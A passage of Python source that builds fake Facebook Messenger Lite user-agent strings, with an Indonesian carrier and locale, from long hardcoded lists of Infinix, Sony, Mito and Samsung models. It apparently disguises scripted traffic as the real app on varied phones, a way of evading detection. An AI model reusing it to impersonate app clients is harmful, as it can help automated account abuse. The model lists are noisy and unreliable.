'Infinix X604B', 'Infinix X605', 'Infinix X610B', 'Infinix X610B', 'Infinix X610B', 'Infinix X690', 'Infinix X690B', 'Infinix X690B', 'Infinix X656', 'Infinix X656', 'Infinix X692', 'Infinix X692', 'Infinix X683B', 'Infinix X450', 'Infinix X5010', 'Infinix X5010', 'Infinix X401', 'Infinix S2', 'Infinix S2 Pro', 'Infinix S2 Pro', 'Infinix X626B', 'Infinix X626B', 'Infinix X626', 'Infinix X626B', 'Infinix X652A', 'Infinix X652', 'Infinix X652', 'Infinix X652A', 'Infinix X652A', 'Infinix X652B', 'Infinix X652C', 'Infinix X660C', 'Infinix X660C', 'Infinix X660B', 'Infinix X660C', 'Infinix X5515F', 'Infinix X5515I', 'Infinix X609', 'fr_MA Infinix X609', 'Infinix X5514D', 'Infinix X5516B', 'Infinix X5516C', 'Infinix X627', 'Infinix X627', 'Infinix X627', 'Infinix X653C', 'Infinix X680', 'Infinix X653', 'ar_AE Infinix X680', 'ar_AE Infinix X653', 'Infinix X680D', 'Infinix X657', 'Infinix X657B', 'Infinix X657C', 'Infinix X657', 'Infinix X657B', 'Infinix X6511', 'Infinix X6511B', 'Infinix X6511E', 'Infinix X6512', 'Infinix X6823', 'Infinix X6823C', 'Infinix X6823B', 'Infinix X6515', 'Infinix X6516', 'Infinix X6517', 'Infinix X612B', 'Infinix X503', 'Infinix X511', 'Infinix X352', 'Infinix X351', 'Infinix X351', 'Infinix X530', 'Infinix X530', 'Infinix X6711', 'Infinix X6716', 'Infinix X678B', 'Infinix Y88', 'Infinix X509', 'Infinix X6821', 'Infinix X6821', 'Infinix-X552', 'Infinix Zero 3', 'Infinix Zero 3', 'Infinix Zero 4', 'Infinix Zero 4 Plus', 'Infinix Zero 4 Plus', 'Infinix X603', 'Infinix X603-LTE', 'Infinix X6815C', 'Infinix X6815D', 'Infinix X6815B', 'Infinix X6815D', 'Infinix X6815C', 'Infinix X620B', 'Infinix X620', 'Infinix X620', 'Infinix X687', 'Infinix X687', 'Infinix X687', 'Infinix X687B', 'Infinix X6820', 'Infinix X6811B', 'Infinix X6811B', 'Infinix X6810', 'Infinix X6810'])
                self.useragent = (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/Infinix;FBBD/Infinix;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')
            elif "Sony" in str(self.device):
                self.android_model = random.choice(['BRAVIA 2015', 'BRAVIA 2K GB ATV3', 'BRAVIA 4K 2015', 'BRAVIA 4K GB', 'BRAVIA 4K GB ATV3', 'BRAVIA 4K UR2', 'BRAVIA 4K UR3', 'BRAVIA 4K VH2', 'BRAVIA VH1', 'BRAVIA VU1', 'Sony Experia 10', 'H4433', 'SONY-M880', 'SGP412', 'SGP551', 'SmartWatch 3', 'Sony Tablet P', 'Sony Tablet P', 'Sony Tablet P', 'Sony Tablet P', 'Sony Tablet S', 'Sony Tablet S', 'Sony Tablet S', 'Sony Tablet S', 'Sony Tablet S', 'NW-A100Series', 'NW-Z1000Series', 'Sony Xperia', 'J9110', '802SO', 'SOV40', 'SO-51A', 'SOG01', 'XQ-AT51', 'XQ-AT42', 'SO51Aa', 'SO-51B', 'XQ-BC52', 'SOG03', 'XQ-BC72', 'XQ-CT72', 'XQ-CT54', 'SOG06', 'I4113', 'I3113', 'I4193', 'SO-41A', 'SOV43', 'A001SO', 'XQ-AU52', 'XQ-AT52', 'XQ-BT52', 'SOG04', 'A102SO', 'SO-52B', 'XQ-BT44', 'XQ-CC54', 'XQ-CC72', 'SO-52C', 'A202SO', 'I4293', 'I4213', 'SOV41', '901SO', 'SO-01M', 'J8210', 'J9210', 'SO-52A', 'SOG02', 'XQ-AS52', 'A002SO', 'XQ-AS72', 'XQ-BQ52', 'SO-53B', 'SOG05', 'XQ-BQ72', 'A103SO', 'XQ-CQ54', 'XQ-CQ72', 'SOV42', '902SO', 'J3273', 'SO-04E', 'SonySO-04E', 'Xperia A', 'SO-04F', 'SAMSUNG Xperia a369i', 'SO-04G', 'SO-04G', 'J3173', 'SO-41B', 'SOG08', 'SO-53C', 'A203SO', 'Xperia Active', 'Xperia Active', 'Xperia Active', 'Xperia Arc', 'Xperia Arc', 'Xperia Arc', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'LT26w', 'LT26w', 'SO-01E', 'Sony Xperia B6376', 'XPERIA BEAST 3', 'Xperia Burst', 'S39h', 'C2304', 'C2305', 'C2304', 'C2305', 'D2533', 'D2502', 'E5306', 'E5303', 'E5303', 'E5353', 'E5333', 'E5363', 'E5333', 'Xperia C5', 'E5553', 'E5506', 'E5533', 'E5563', 'XPERIA CUSTOM XA8', 'C1505', 'C1505', 'C1504', 'SonyC1504', 'SonyC1505v', 'SonyC1505', 'SonyC1504', 'SonyC1505', 'SonyC1504', 'C1505', 'C1505', 'SonyC1505', 'SonyC1505', 'SonyC1505', 'C1604', 'SonyC1605', 'SonyC1604', 'C1605', 'C1605', 'SonyC1605', 'C1604', 'SonyC1605', 'D2005', 'D2004', 'SonyD2005', 'D2005', 'D2104', 'D2114', 'D2105', 'D2105', 'XPERIA E16i', 'D2203', 'D2202', 'D2243', 'D2206', 'Xperia E3 3G', 'E3 Dual', 'D2212', 'D2212', 'D2212', 'E2115', 'E2104', 'E2105', 'xperia e4 dual', 'E2003', 'E2053', 'E2006', 'E2043', 'E2033', 'E2033', 'F3311', 'F3313', 'Xperia F_v3 Ultra', 'SONY XPERIA G', 'SonyST27a', 'SonyST27i', 'ST27a', 'ST27i', 'ST27I', 'ru ST27i', 'SonyST27i', 'SonyEricssonST27i', 'ST27i', 'ST27i', 'SO-04D', 'SonySO-04D', 'Xperia H870', 'SonyLT28i', 'SonyLT28h', 'LT28h', 'SonyEricssonLT28at', 'SonyEricssonLT28h', 'LT28i', 'LT28h', 'SonyLT28h', 'Xperia ion', 'Xperia ion', 'SonyEricssonLT28i', 'SonyEricssonLT28i', 'SonyEricssonLT28h', 'SonyEricssonLT28i', 'SonyST26a', 'ST26a', 'SonyST26i-o', 'SonyST26i', 'ST26i', 'ST26i', 'Xperia J', 'SonyST26i', 'SonyST26i', 'SonyST26i', 'SonyST26i', 'SonyST26i', 'ST26i', 'C2105', 'C2105', 'C2105', 'C2105', 'C2105', 'G3311', 'G3311', 'G3313', 'G3312', 'ru G3312', 'H3311', 'H3321', 'H4311', 'I3312', 'I4312', 'XQ-AD52', 'C1905', 'C1904', 'C1905', 'SonyC1904', 'SonyC1905', 'C1905', 'C1905', 'C2004', 'C2005', 'D2303', 'D2306', 'D2303', 'Xperia M2 3G', 'D2406', 'D2403', 'D2302', 'XPERIA M2 HSPASS', 'E2303', 'E2333', 'E2306', 'E2363', 'E2312', 'E2312', 'E5603', 'E5606', 'E5653', 'E5633', 'E5663', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia mini pro', 'ST23i', 'SonyST23iv', 'SonyST23a', 'ST23i', 'SonyST23i', 'ST23i', 'ST23i', 'ST23i', 'SonyST23i', 'SonyST23i', 'SonyST23i', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo L', 'Xperia Neo V', 'Xperia Neo V', 'Sony Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'SO-02D', 'Xperia P', 'SonyLT22i', 'LT22i', 'SonyEricssonLT22i', 'SonyEricssonLT22i-o', 'LT22i', 'LT22i', 'LT22i', 'SonyEricssonLT22i-o', 'SonyLT22i', 'XQ-AQ52', 'XQ-AQ62', 'XQ-BE52', 'XQ-BE62', 'XQ-BE72', 'G2299', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Sony Xperia RC', 'Sony Xperia RC', 'SonyLT26iv', 'LT26i', 'SonyEricssonLT26i-o', 'SonyEricssonLT26i', 'LT26i', 'Xperia S', 'LT26i', 'SonyEricssonLT26i', 'Xperia S', 'Xperia S', 'Xperia S', 'SonyLT26i', 'LT26ii', 'ru LT26ii', 'LT26ii', 'LT26ii', 'Xperia Sola', 'Xperia Sola', 'C5303', 'C5302', 'C5306', 'SonyC5303', 'SonyC5306', 'C5303', 'Xperia SP', 'SO-05D', 'LT30p', 'SonyLT30p-o', 'LT30p', 'SonyLT30p', 'LT30p', 'LT30a', 'SonyLT30a', 'D5303', 'D5306', 'D5316', 'XM50h', 'XM50t', 'D5303', 'D5322', 'Xperia T3', 'D5103', 'D5102', 'D5106', 'D5103', 'Xperia Tab', 'SGPT12', 'Xperia Tablet S', 'SGPT13', 'SGPT13', 'SGPT12', 'SGP311', 'SGP321', 'SGP312', 'SGP512', 'SGP511', 'SGP521', 'SGP621', 'SGP611', 'SGP712', 'SonyST21i', 'SonyST21i', 'SonyST21i-o', 'ST21i', 'ST21a', 'ST21i', 'SonyST21a', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21a', 'SonyST21i', 'SonyST21a', 'ST21i2', 'SonyST21a2', 'SonyST21i2', 'SonyST21i2', 'SonyST21i2', 'ru ST21i2', 'SonyST21i2', 'ST21i2', 'LT29i', 'Xperia TX', 'SonyST25i', 'ST25a', 'ST25i', 'ST25a', 'SonyEricssonST25i', 'ST25i', 'ru ST25i', 'ST25i', 'SonyEricssonST25i', 'SonyEricssonST25i', 'SonyEricssonST25i', 'SOL22', 'SOL22', 'SonySOL22', 'Xperia UL', 'Xperia V', 'SonyLT25i', 'Sony Xperia V', 'SonyLT25i', 'SonySOL21', 'F5121', 'F5321', 'SO-02J', 'F5122', '502SO', 'F8131', 'SO-04H', 'SOV33', 'F8132', 'Xperia X10', 'Xperia X10', 'Xperia X10', 'Xperia X10', 'Xperia x10 Mini Pro', 'Xperia X42', 'Xperia X8', 'XPERIA X8', 'Xperia X8', 'XPERIA X8', 'XPERIA X8', 'Xperia X8', 'Xperia X8', 'Xperia X8', 'XPERIA X8', 'F3111', 'F3115', 'Xperia XA 4', 'F3112', 'F3116', 'F3211', 'F3215', 'F3216', 'F3212', 'G3112', 'G3116', 'G3121', 'G3416', 'G3412', 'G3421', 'G3426', 'G3426', 'G3221', 'G3223', 'G3226', 'G3212', 'Xperia XA1 Unlocked', 'H3113', 'H4113', 'H4133', 'H4413', 'H4493', 'H3413', 'Xperia XA2 Plus Dual (AOSP)', 'H4213', 'H3213', 'H3223', 'H4233', 'Xperia XR', 'Xperia XR', '601SO', 'F8331', 'F8332', 'SO-01J', 'G8142', 'G8141', 'SO-04J', 'SO-04K', 'Xperia XZ Premium Dual (AOSP)', 'SO-01K', 'G8341', 'G8342', 'G8343', 'Xperia XZ1 (AOSPA)', 'G8441', 'SO-02K', 'Xperia XZ1 Dual', 'Xperia XZ1 Dual (AOSP)', 'SO-03K', 'H8324', 'SOV37', '702SO', 'H8216', 'SOV37', 'SO-05K', 'SO-05K', 'H8266', 'SOV38', 'H8116', 'H8166', 'H8416', '801SO', 'SO-01L', 'H9436', 'H9493', 'Xperia XZ3 Dual (AOSP)', 'Xperia XZ4', '602SO', 'G8231', 'G8232', 'SOV35', 'SOV35', 'C6603', 'C6602', 'C6833', 'C6802', 'SonySOL24', 'C6903', 'C6902', 'SO-02F', 'C6943', 'D5503', 'Xperia Z1s', 'Xperia Z1s', 'xperia z1s', 'D6503', 'D6503', 'D6503', 'SO-03F', 'SGP561', 'SOT21', 'Xperia Z2 Tablet WiFi', 'D6563', 'xperia z2a', 'D6653', 'D6603', 'SO-01G', 'SOL26', 'D6643', 'D5803', 'SO-02G', 'D5833', 'D6633', 'D6633', 'E6533', 'E6553', 'E6533', 'Xperia Z3C', 'Xperia z3Dual', 'Xperia z3tc', 'D6708', 'SOV31', 'SGP771', 'SO-03G', '402SO', 'Xperia Z4 Tablet', 'Xperia Z4 Tablet Wifi', 'Xperia Z4 Xtreme', 'xperia z4v', 'moto e22', '501SO', 'E6653', 'SO-01H', 'E6603', 'SO-02H', 'E5823', 'E5803', 'E5823', 'E6633', 'E6683', 'E6853', 'SO-03H', 'E6883', 'E6833', 'Xperia Z5P', 'Xperia Z7', 'C6502', 'C6506', 'C6503', 'SonyC6506', 'C6503', 'SOL25', 'Xperia ZQ', 'C5503', 'C5502'])
                self.useragent = (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/Sony;FBBD/Sony;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')
            elif "Mito" in str(self.device):
                self.android_model = random.choice(['MITO A230', 'Mito A67', 'MITO_A37_Z1', 'MITO A355', 'MITO_T7', 'MITO_A36_W1'])
                self.useragent = (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/MITO;FBBD/MITO;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')
            elif "Samsung" in str(self.device):
                self.android_model = random.choice(['samsung 19A', 'samsung a1', 'Samsung A10', 'Samsung A20', 'samsung A21', 'Samsung A33', 'Samsung A4', 'samsung A5', 'Samsung A50', 'Samsung A51', 'Samsung A52s', 'samsung A56', 'Samsung A7', 'samsung A7', 'Samsung A70', 'SAMSUNG A800F', 'SM-W750V', 'Trident/7.0', 'Trident/7.0', 'Samsung Chrome 11 (3180)', 'Samsung Chromebook Pro', 'Samsung Chromebook 3', 'Samsung Chromebook Plus (V2)', 'SAMSUNG F12', 'Samsung F41', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800D', 'GT-I5800', 'GT-I5800', 'SAMSUNG SM-A716S', 'SM-A015F', 'SM-A015M', 'SM-A013M', 'SM-A013F', 'SM-A013G', 'SM-A022F', 'SM-A022M', 'SM-S124DL', 'SM-A025V', 'SM-A025G', 'SM-A025F', 'SM-A025U', 'SM-A025M', 'SM-A025F', 'SAMSUNG SM-A035G', 'SM-A035M', 'SM-A035F', 'SAMSUNG SM-A035M', 'SM-A032F', 'SM-A032M', 'SM-A037U', 'SM-A037U1', 'SM-S134DL', 'SAMSUNG SM-A037F', 'SM-A037M', 'SM-A045M', 'SM-A045F', 'SAMSUNG SM-A045F', 'SM-A042F', 'SM-A042M', 'SAMSUNG SM-A042F', 'SM-A047F', 'SAMSUNG SM-A047F', 'SM-A105FN', 'SAMSUNG SM-A105FN', 'SM-A105G', 'SM-A105M', 'U', 'SM-S102DL', 'SM-A102U', 'SAMSUNG SM-A102U', 'SAMSUNG SM-A102U1', 'SM-A107M', 'SM-A107F', 'SM-A107F', 'SM-A115F', 'SM-S115DL', 'SM-A115M', 'SM-A115F', 'SAMSUNG SM-A125F', 'SM-A127F', 'SM-A125U', 'SM-A137F', 'SM-A135F', 'SM-A135U1', 'SAMSUNG SM-A135F', 'SAMSUNG SM-A137F', 'SM-A135M', 'SM-A136U', 'SM-S136DL', 'SM-A136W', 'SM-A136B', 'SM-A145R', 'SAMSUNG SM-A145R/A145RXXU1AWD1', 'SM-A145F', 'SM-A145P', 'SAMSUNG SM-A145F', 'SM-A146U', 'SM-A146P', 'SM-A146U1', 'SAMSUNG SM-A146U', 'SM-A260G', 'SM-A260F', 'SM-A260F', 'SM-A205U', 'SAMSUNG SM-A205U1', 'SM-A205F', 'SM-A205W', 'SM-A205G', 'SM-S205DL', 'SM-A205GN', 'SM-A202F', 'SAMSUNG SM-A202F', 'SM-A207F', 'SM-A207M', 'SM-S215DL', 'SM-A215U1', 'SAMSUNG SM-S215DL', 'SM-A102J', '720x1448', 'SC-42A', 'SM-A217F', 'SAMSUNG SM-A217F', 'SM-A217M', 'U', 'SM-A225F', 'SM-A225M', 'SAMSUNG SM-A225F', 'SAMSUNG SM-A226B', 'SM-A226BR', 'SM-A235F', 'SM-A235N', 'SM-A236B', 'SM-A236E', 'SM-A236U', 'SAMSUNG SM-A236M', 'SAMSUNG SM-A236U1', 'SM-A236V', 'SM-A245F', 'SAMSUNG SM-A245F', 'SM-A245M', 'Samsung Galaxy A24', 'SM-A300FU', 'SM-A300H', 'SM-A310F', 'SAMSUNG SM-A310F', 'SM-A310F', 'SM-A310M', 'SM-A320F', 'SM-A320FL', 'SAMSUNG SM-A320FL', 'SM-A305FN', 'SM-A305GN', 'SM-A305N', 'SM-A305GT', 'Flow', 'SM-A307FN', 'SM-A307GT', 'SM-A307GN', 'SM-A315G', 'SM-A315F', 'SM-A315N', 'SM-A325F', 'SM-A325M', 'SAMSUNG SM-A325F', 'SM-A326W', 'SM-A326U', 'SM-A326B', 'SAMSUNG SM-A326B', 'SM-S326DL', 'SM-A336B', 'SAMSUNG SM-A336E', 'SM-A336M', 'SM-A336N', 'SM-A346B', 'SM-A346M', 'SAMSUNG SM-A346M', 'SM-A3460', 'SM-A346E', 'SAMSUNG SM-A346B/A346BXXU1AWB9', 'SAMSUNG SM-A346E', 'SAMSUNG SM-A430F', 'SM-A405FN', 'SAMSUNG SM-A405FN', 'SM-A405FN', 'SM-A405FN/DS', 'SM-A405S', 'SM-A3050', 'SM-A3051', 'SM-A3058', 'SM-A415F', 'SC-41A', 'SM-A4260', 'SM-A426U', 'SM-A426U1', 'SM-A426U', 'SM-A426B', 'SAMSUNG SM-A426B/A426BXXU4DVL3', 'SM-A426N', 'SAMSUNG SM-A426U', 'SM-A5009', 'SM-A500YZ', 'SM-A500W', 'SM-A500L', 'SAMSUNG SM-A500W', 'SAMSUNG SM-A500L', 'SM-A500X', 'SM-A500XZ', 'SM-A500XZ', 'SM-A500XZ', 'SM-A510F', 'SAMSUNG SM-A510F', 'SM-A510F', 'SM-A520F', 'SAMSUNG SM-A520F', 'SM-A520K', 'SM-A500M', 'SM-A500H', 'SM-A500F', 'SM-A500F', 'SM-A500FU', 'SM-A505FN', 'SM-A505G', 'SM-A505FM', 'SM-A505U', 'SM-A507FN', 'SM-A515F', 'SM-A515F', 'SM-A515U', 'SM-A516U', 'SM-A516B', 'SM-A516B/DS', 'SM-A516N', 'SC-54A', 'SM-A516V', 'SCG07', 'SM-A525F', 'SAMSUNG SM-A525F', 'SM-A525M', 'SAMSUNG SM-A526B', 'SM-A526W', 'SM-A526U', 'SM-A5260', 'SM-A528B', 'SAMSUNG SM-A528B', 'SAMSUNG SM-A528B/A528BXXU3EWE1', 'SM-A536E', 'SM-A536B', 'SAMSUNG SM-A536E', 'SM-A5360', 'SM-A536U', 'SM-A536U1', 'SM-A536V', 'SAMSUNG SM-A536V', 'SM-A546U1', 'SM-A546E', 'SM-A546B', 'SM-A5460', 'SAMSUNG SM-A546U', 'SM-A546W', 'SM-A546V', 'SAMSUNG SM-A600FN', 'SM-A600G', 'SM-A605FN', 'SM-A605G', 'SM-A6050', 'SM-A605GN/DS', 'SAMSUNG SM-A605FN', 'SM-A6060', 'SM-A606Y', 'SAMSUNG SM-A606Y', 'SM-G6200', 'SM-G6200', 'SM-A7000', 'SM-A700FD', 'SM-A700K', 'SM-A700H', 'SM-A700YD', 'SM-A710F', 'SM-A7100', 'SM-A710K', 'SM-A710M', 'SM-A720F', 'SM-A750FN', 'SAMSUNG SM-A750FN', 'SM-A750N', 'SM-A750GN', 'SM-A705FN', 'SM-A705MN', 'SM-A705GM', 'SM-A705W', 'SM-A707F', 'SAMSUNG SM-A707F', 'SAMSUNG SM-A7070', 'SM-A715F', 'SM-A715W', 'SM-A715F', 'SM-A715F', 'SM-A716U', 'SM-A716U1', 'SAMSUNG SM-A716U', 'SM-A716V', 'SAMSUNG SM-A716U1', 'SM-A725F', 'SM-A725M', 'SAMSUNG SM-A725F', 'SAMSUNG SM-A736B', 'SM-A736B', 'SM-A530F', 'SAMSUNG SM-A530F', 'SM-A8000', 'SM-A810F', 'SM-A810YZ', 'SAMSUNG SM-A810YZ', 'SM-A810S', 'SM-A530N', 'SM-A530W', 'SAMSUNG SM-A530W', 'SAMSUNG SM-G885F', 'SM-G885Y', 'SAMSUNG SM-G885S', 'SAMSUNG SM-G885Y', 'samsung SM-G885F', 'SM-A730F', 'SM-A805F', 'SAMSUNG SM-A805F', 'SM-A8050', 'SM-A805N', 'SM-G8870', 'SM-G887F', 'SM-A8s', 'SAMSUNG SM-G8870', 'SM-A9000', 'SM-A920F', 'SAMSUNG SM-A920F/A920FXXS7CVI7', 'U', 'SM-A910F', 'SM-G887N', 'SM-G887N', 'SM-A910F', 'SM-A9100', 'SM-G8850', 'SAMSUNG SM-G8850', 'SM-G8858', 'SM-G8850', 'SAMSUNG SM-A908B', 'SM-A908N', 'SAMSUNG SM-A908B/A908BXXU5EVK3', 'SAMSUNG SM-A908B/A908BXXU5EVG6', 'SAMSUNG SM-A9080', 'SM-A9080', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830M', 'GT-S5830i', 'GT-S5830i', 'GT-S5830L', 'GT-S5830G', 'GT-S5830M', 'GT-S5830M', 'GT-S5830C', 'GT-S5830V', 'GT-I8160', 'GT-I8160', 'GT-I8160', 'GT-I8160P', 'GT-I8160', 'GT-I8160P-ORANGE/I8160PBVLK3', 'GT-I8160', 'GT-I8160', 'GT-I8160', 'SAMSUNG GT-I8160/I8160BOLK2', 'SAMSUNG GT-S7275R/S7275RXXUAMK2', 'SAMSUNG GT-S7275R/S7275RXXUAPA2', 'GT-S7275R', 'SAMSUNG GT-S7275R-ORANGE', 'SAMSUNG GT-S7275R/S7275RXXUAPA2', 'GT-S7275B', 'GT-S7275B', 'GT-S7275B', 'GT-S7275T', 'GT-S7275Y', 'SM-G313HY', 'SM-G313MY', 'SM-G313MU', 'SM-G316MY', 'SM-G316M', 'SM-G316ML', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G313HZ', 'SM-G313HU', 'SM-G313U', 'SM-G318H', 'GT-S7500', 'GT-S7500', 'SAMSUNG GT-S7500/S7500BUMB1', 'GT-S7500', 'GT-S7500', 'GT-S7500T', 'GT-S7500', 'GT-S7500W', 'GT-S7500T', 'GT-S7500L', 'GT-S7500L', 'GT-S7500T', 'GT-S7500L', 'GT-S7500T', 'SM-G357FZ', 'SM-G310HN', 'SAMSUNG SM-G357FZ/G357FZXXU1AOE1', 'SM-G357FZ', 'SC-01H', 'SC-01H', 'SM-G850F', 'SM-G850F', 'SM-G850M', 'SAMSUNG-SM-J327AZ', 'SAMSUNG SM-J327AZ', 'SM-J337AZ', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'SM-G386T', 'SM-G386T1', 'SM-G386T1', 'SAMSUNG SM-G386T', 'SM-G386T', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'SM-G3858', 'SM-G3858', 'SAMSUNG-SM-G3858_TD/1.0 Android/4.2.2 Release/10.15.2013 Browser/AppleWebKit534.30', 'SM-G3858', 'SM-G3858', 'SM-G3858', 'SM-A226L', 'SAMSUNG SM-A226L', 'SM-M236L', 'SAMSUNG SM-M236L', 'SM-C5000', 'SAMSUNG SM-C5000', 'SAMSUNG SM-C500X', 'SM-C5010', 'SAMSUNG SM-C5010', 'SAMSUNG SM-C5018', 'SM-C7000', 'SAMSUNG SM-C7000', 'SM-C7000', 'SM-C7010', 'SM-C701F', 'SAMSUNG SM-C7010', 'SAMSUNG SM-C701F', 'SM-C7018', 'SAMSUNG SM-C7100', 'SM-C7108', 'SAMSUNG SM-C7108', 'SM-C9000', 'SM-C900F', 'SM-C900Y', 'EK-GC100', 'EK-GC100', 'EK-GC100', 'EK-GC120', 'EK-GC200', 'EK-GC200', 'EK-GC110', 'EK-GC110', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330B', 'GT-B5330B', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330L', 'GT-I8262', 'GT-I8262', 'GT-I8262', 'GT-I8260', 'GT-I8262', 'GT-I8262B', 'GT-I8262D', 'GT-I8262D', 'GT-I8262B', 'SM-G355H', 'SM-G355M', 'SHW-M570S', 'SAMSUNG GT-I8580', 'SHW-M570S', 'SAMSUNG SHW-M570S', 'GT-I8580', 'GT-I8580', 'GT-I8580', 'SAMSUNG GT-I8580', 'SM-G3589W', 'SM-G3589W', 'SM-G3589W', 'SAMSUNG-SM-G3589W', 'SM-G386W', 'SM-G386F', 'SM-G3518', 'SM-G3586V', 'SM-G3586V', 'SM-G3518', 'SM-G3518', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G3568V', 'SM-G3568V', 'SM-G350E', 'SM-G350', 'SM-G3509I', 'SM-G3508J', 'SM-G3502I', 'SM-G3502C', 'SM-G360BT', 'SM-S820L', 'SM-G360H', 'SM-G360F', 'SM-G360T', 'SM-G360M', 'SM-G361H', 'SM-G361F', 'SM-G361HU', 'SAMSUNG SM-G361H', 'SCH-R740C', 'SGH-S730M', 'SGH-S730G', 'SCH-R740C', 'SCH-R740C', 'SCH-R740C', 'SCH-R740C', 'SM-E500H', 'SM-E500F', '720x1280', 'SM-E500M', 'SM-E5000', 'SM-E500YZ', 'SM-E700H', 'SM-E700F', 'SM-E7009', 'SM-E700M', 'GT-I8730', 'GT-I8730', 'GT-i8730', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'GT-I8730T', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'SM-G3815', 'SAMSUNG SM-G3815/G3815XXUCOE1', 'SM-G3815', 'SAMSUNG SM-G3815/G3815XXUCNH1', 'SM-E025F', 'SM-F127G', 'SM-E135F', 'SM-E225F', 'SM-E236B', 'SAMSUNG SM-E236B', 'SM-F415F', 'SM-E426B', 'SAMSUNG SM-E426B', 'SM-E5260', 'SAMSUNG SM-E5260', 'SM-E625F', 'GT-S6810M', 'GT-S6810', 'GT-S6810P', 'GT-S6810B', 'GT-S6810L', 'GT-S6810L', 'GT-S6810E', 'GT-S6810M', 'GT-S6810L', 'GT-S6810E', 'GT-S6810M', 'GT-S6810E', 'GT-S6810M', 'GT-S6810P', 'GT-S6812C', 'GT-S6812', 'GT-S6812i', 'GT-S6812i', 'GT-S6812C', 'GT-S6812i', 'GT-S6812i', 'GT-S6812i', 'GT-S6812B', 'GT-S6812i', 'GT-S6812B', 'GT-S6812B', 'GT-S6790L', 'GT-S6790N', 'GT-S6790N', 'GT-S6790N', 'GT-S6790N', 'GT-S6790L', 'SC-04J', 'SC-02L', 'SM-F907B', 'SM-F900U', 'SM-F900F', 'SM-F907N', 'SM-F9000', 'SM-F900U1', 'SM-F900W', 'SM-G150NL', 'SM-G155S', 'SM-G150N0', 'SM-G150NS', 'SM-G1650', 'SM-W2015', 'SM-W2015', 'SAMSUNG-SM-W2015', 'GT-I9128I', 'GT-I9128I', 'GT-I9128E', 'SM-G7102', 'SM-G7102', 'SM-G7105', 'SM-G7106', 'SM-G7108', 'GT-I9082', 'GT-I9082', 'GT-I9082C', 'SM-G7202', 'SM-G720N0', 'SM-G7200', 'SM-G720AX', 'SM-G7200', 'SM-G7200', 'SM-G7200', 'SM-G720N0', 'SM-G7200', 'SM-G720AX', 'SM-G720N0', 'SM-G7200', 'SM-G7200', 'SM-G720N0', 'SM-G720N0', 'SM-G7202', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9063T', 